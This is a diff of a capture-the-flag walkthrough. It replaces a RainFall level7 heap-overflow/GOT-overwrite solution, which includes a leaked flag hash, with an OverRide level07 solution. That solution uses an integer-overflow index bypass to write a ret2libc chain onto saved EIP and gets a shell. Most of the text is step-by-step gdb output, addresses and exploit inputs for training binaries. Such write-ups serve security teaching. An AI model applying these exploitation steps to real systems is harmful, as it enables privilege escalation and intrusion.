@@ -1,138 +1,188 @@
-# We have a executable "level7" lets do some test!
+We have a programm that can store and read data from a int tab with a size of 100. But we can see using dog bolt or gdb that there is no check on boundaries.
+We can interact outside of the tab to read the stack or write on it like a printf format exploit attack.
+The goal is to find where is eip relative to the tab index, and than try to write over it to do a ret2libc attack
 
-level7@RainFall:~$ ./level7
-Segmentation fault (core dumped)
-level7@RainFall:~$ ./level7 test
-Segmentation fault (core dumped)
-level7@RainFall:~$ ./level7 test test
-~~
-level7@RainFall:~$ ./level7 test test test
-~~
-level7@RainFall:~$
+the exploit will look like this starting at eip : system address + exit address + /bin/sh address
 
-# Hum so the program take a minimum of two argument and print ~~
+Using dogbolt we can see that the tab is sent as a parameter of store_number and read_number functions:
 
-# Let's use gdb to disasamble main
+    if ( !memcmp(s, "store", 5u) )
+    {
+      number = store_number((int)v6);
+    }
 
-(gdb) disas main
-[...]
-   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
-[...]
-   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
-[...]
-   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
-[...]
-   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
-[...]
-   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
-[...]
-   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
-[...]
-   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
-[...]
-   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
-   0x080485f0 <+207>:	movl   $0x8048703,(%esp)
-   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
-[...]
+So if we place ourselves on a break at store_number, we can than read $eax to see the adress of the tab.
 
-# There is a lot of call, let's use ltrace to see more clearly what's the code do
+(gdb) b store_number 
+Breakpoint 1 at 0x8048636
+(gdb) run
+Starting program: /home/users/level07/level07 
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!   
+----------------------------------------------------
+ Commands:                                          
+    store - store a number into the data storage    
+    read  - read a number from the data storage     
+    quit  - exit the program                        
+----------------------------------------------------
+   wil has reserved some storage :>                 
+----------------------------------------------------
 
-level7@RainFall:~$ ltrace ./level7 test1 test2
-__libc_start_main(0x8048521, 3, 0xbffff6e4, 0x8048610, 0x8048680 <unfinished ...>
-malloc(8)                                                                                                                     = 0x0804a008
-malloc(8)                                                                                                                     = 0x0804a018
-malloc(8)                                                                                                                     = 0x0804a028
-malloc(8)                                                                                                                     = 0x0804a038
-strcpy(0x0804a018, "test1")                                                                                                   = 0x0804a018
-strcpy(0x0804a038, "test2")                                                                                                   = 0x0804a038
-fopen("/home/user/level8/.pass", "r")                                                                                         = 0
-fgets( <unfinished ...>
---- SIGSEGV (Segmentation fault) ---
-+++ killed by SIGSEGV +++
+Input command: store
 
-# So the strcpy take argv[1] and argv[2] as argument so we can influence that and the fopen open .pass.
+Breakpoint 1, 0x08048636 in store_number ()
+x/50x $eax
 
-    0x080485e4 <+195>:	movl   $0x8049960,(%esp)
-   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
+0xffffd554:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffd564:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffd574:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffd584:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffd594:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffd5a4:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffd5b4:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffd5c4:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffd5d4:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffd5e4:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffd5f4:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffd604:     0x00000000      0x00000000      0x00000000      0x00000000
 
-# And the result of the fopen is put in the 0x8049960 address
+We can see a lot of 0 because there is a memset 0 at the start of main:
 
-# But the puts call doesnt print this address, maybe there are other function?
+int local_1bc [100];
 
-(gdb) info function
-[...]
-0x080484d0  frame_dummy
-0x080484f4  m
-0x08048521  main
-[...]
+puVar4 = local_1bc;
+for (iVar2 = 100; iVar2 != 0; iVar2 = iVar2 + -1) {
+  *puVar4 = 0;
+  puVar4 = puVar4 + 1;
+}
 
-# There is a m function
+We can try to store a number and see if the tab change using eax:
 
-(gdb) disas m
-[...]
-   0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)
-   0x08048517 <+35>:	mov    %edx,(%esp)
-   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
-[...]
-
-# And the m function printf the same address fgets use to put the return of fopen!
-
-# So we must call the m function after the fgets call but how?
-
-# Well the program take two args and we can make the first overflow in the second! (0x0804a018/0x0804a038)
-
-# So we can change where the address of the puts point to make it point to the m function!
-
-gdb) x/i 0x8048400
-   0x8048400 <puts@plt>:	jmp    *0x8049928
-
-# We will make that the first argument will buffer overflow the second argument by 4 bytes and those byte are the address where puts go (0x8049928)
-
-# And after that the second argument will replace that by the address of the m function! (0x080484f4)
-
-# We just need to determine the padding
-
-gdb) b *0x080485a5
-Breakpoint 1 at 0x80485a5
-(gdb) b *0x080485c2
-Breakpoint 2 at 0x80485c2
-
-# Now let's do some test
-
-(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA test
-Starting program: /home/user/level7/level7 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA test
-
-Breakpoint 1, 0x080485a5 in main ()
-(gdb) x/s $eax
-0x804a018:	 'A' <repeats 35 times>
-(gdb) continue
+(gdb) c
 Continuing.
+ Number: 55555
+ Index: 2
+ Completed store command successfully
+Input command: store
+
+Breakpoint 1, 0x08048636 in store_number ()
+(gdb) x/20x $eax
+0xffffd554:     0x00000000      0x00000000      0x0000d903      0x00000000
+0xffffd564:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffd574:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffd584:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffd594:     0x00000000      0x00000000      0x00000000      0x00000000
+
+0x0000d903 = 55555
+
+It change ! So 0xffffd554 is effectively the adress of the tab
+
+(gdb) info frame
+Stack level 0, frame at 0xffffd720:
+ eip = 0x8048729 in main; saved eip 0xf7e45513
+ Arglist at 0xffffd718, args: 
+ Locals at 0xffffd718, Previous frame's sp is 0xffffd720
+ Saved registers:
+  ebp at 0xffffd718, eip at 0xffffd71c
+
+
+so 0xffffd554 is the address of our tab and 0xffffd71c is the address of eip.
+
+0xffffd71c - 0xffffd554 = 456
+
+since its a int we need to divide by 4
+
+456/4 = 114
+
+lets try to read 114 index:
+
+Input command: read
+ Index: 114
+ Number at data[114] is 4158936339
+ Completed read command successfully
+
+
+ 4158936339 = 0xF7E45513
+
+ (gdb) x/x 0xF7E45513
+ 0xf7e45513 <__libc_start_main+243>:     0x00019655e8240489 
+
+So index 114 is refering to eip. We now want to write to this index, but we cant because there is a protection:
+
+v3 = get_unum();
+  if ( v3 == 3 * (v3 / 3) || HIBYTE(unum) == 183 )
+  {
+    puts(" *** ERROR! ***");
+    puts("   This index is reserved for wil!");
+    puts(" *** ERROR! ***");
+    return 1;
+  }
+
+v3 == 3 * (v3 / 3) block 114 value.
+
+But we can go around that by doing a int overflow. 2147483647 is max int. We add 115 to it so when it shrink to fit we end up with 114 as a value.
+
+Input command: store
+ Number: 2147483762
+ Index: 2147483762
+
+Breakpoint 1, 0x080486d6 in store_number ()
+(gdb) c
+Continuing.
+ Completed store command successfully
+Input command: read
+ Index: 114
+ Number at data[114] is 2147483762
+ Completed read command successfully
+Input command: quit
 
 Program received signal SIGSEGV, Segmentation fault.
-0xb7eb1922 in ?? () from /lib/i386-linux-gnu/libc.so.6
-
-# 35 is to high
-
-(gdb) r AAAAAAAAAAAAAAAAAAAA test
-Starting program: /home/user/level7/level7 AAAAAAAAAAAAAAAAAAAA test
-
-Breakpoint 1, 0x080485a5 in main ()
-(gdb) x/s $eax
-0x804a018:	 'A' <repeats 20 times>
-(gdb) continue
-Continuing.
-
-Breakpoint 2, 0x080485c2 in main ()
-
-# 20 seems good let's try it outside gdb
-
-level7@RainFall:~$ ./level7 $(python -c "print('A' * 20 + '\x28\x99\x04\x08')") $(python -c "print('\xf4\x84\x04\x08')")
-5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
- - -1327609048
+0x80000072 in ?? ()
 
 
+0x80000072 = 2147483762 so we managed to write on eip with the value we wanted
 
+(gdb) p system
+$2 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) p exit
+$3 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+(gdb) find __libc_start_main, +9999999, "/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+(gdb) 
 
+we will have to use those 3 adress to do a ret2libc attack:
 
+0xf7e6aed0 <system> = 4159090384 at index 2147483762
+0xf7e5eb70 <exit> = 4159040368 at index 115
+0xf7f897ec "/bin/sh" = 4160264172 at index 116
 
+level07@OverRide:~$ ./level07 
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!   
+----------------------------------------------------
+ Commands:                                          
+    store - store a number into the data storage    
+    read  - read a number from the data storage     
+    quit  - exit the program                        
+----------------------------------------------------
+   wil has reserved some storage :>                 
+----------------------------------------------------
 
+Input command: store
+ Number: 4159090384
+ Index: 2147483762
+ Completed store command successfully
+Input command: store
+ Number: 4159040368
+ Index: 115
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+Input command: quit
+$ whoami
+level08
+$ 
